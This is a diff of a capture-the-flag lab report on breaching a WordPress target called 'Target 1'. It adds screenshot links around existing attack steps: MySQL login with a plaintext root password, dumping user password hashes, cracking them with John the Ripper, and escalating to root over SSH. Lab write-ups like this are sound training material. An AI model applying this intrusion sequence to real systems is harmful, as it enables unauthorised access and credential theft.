@@ -68,6 +68,8 @@ The Red Team was successful in breaching 'Target 1' and obtaining the following 
         - cd /var/www
         - find / i-name flag*
         - cat flag2.txt
+        - ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/flagtwohash.png)
+        - ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/flagtwo.png)
 
   - `flag3` : afc01ab56b50591e7dccf93122770cd2
     - **Exploit Used**
@@ -83,6 +85,9 @@ The Red Team was successful in breaching 'Target 1' and obtaining the following 
           - use wordpress;
           - show tables;
           - select * from wp_posts;
+          - ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/mysqlconnect.png)
+          - ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/mysqldatabases.png)
+          - ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/mysqltables.png)
 
   - `flag4` : 715dea6c055b9fe3337544932f2941ce
     - **Exploit Used**
@@ -94,11 +99,13 @@ The Red Team was successful in breaching 'Target 1' and obtaining the following 
         - Commands:
           - Connected to mysql: -u root -p R@v3nSecurity
           - SELECT ID, user_login, user_pass FROM wp_users;
+          - ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/stevenhashedmysql.png)
 
         - When I exported the hashes, I stored them separately as stevenhash.txt and michaelhash.txt and cracked the hashes using John the Ripper.
           - Command:
             - john stevenhash.txt
             - john michaelhash.txt; the execution of the john the ripper continued; however, we already knew the password from the prior action.
+            - ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/johnstevehash.png)
 
           - After cracking Steven's password hash, the next step was to SSH as Steven. Then, as Steven, use Python to check for privilege and escalate to root.
           - Command:
@@ -109,3 +116,4 @@ The Red Team was successful in breaching 'Target 1' and obtaining the following 
             - cd /root
             - ls
             - cat flag4.txt
+            - ![alt text](https://github.com/fpanes/Final-Project/blob/main/Images/Offensive/ravensteve.png)
